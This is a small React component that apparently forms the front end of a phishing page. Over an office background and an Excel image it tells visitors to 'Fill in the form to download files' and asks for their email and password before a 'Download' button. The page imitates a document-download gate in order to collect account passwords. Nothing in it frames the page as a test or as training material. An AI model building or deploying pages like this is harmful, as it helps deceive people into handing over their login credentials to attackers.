import { useState } from 'react'
import bacimg from './assets/office.jpg'
// import viteLogo from './assets/vite.svg'
import heroImg from './assets/excel.png'
import './App.css'

function App() {
  return (
    <>
    <body style={{backgroundImage: `url(${bacimg})`, backgroundSize: 'cover'}}>
      <div>

        <img src={heroImg} alt="hero" ></img>
          <p>Fill in the form to download files</p>
          <form method="POST">
            <input type="email" placeholder='Email' className='fill' required/>
            <input type="password" placeholder='Password' className='fill' required/>
            <button>Download</button>
          </form>

      </div>
    </body>
    </> 
  )
}

export default App
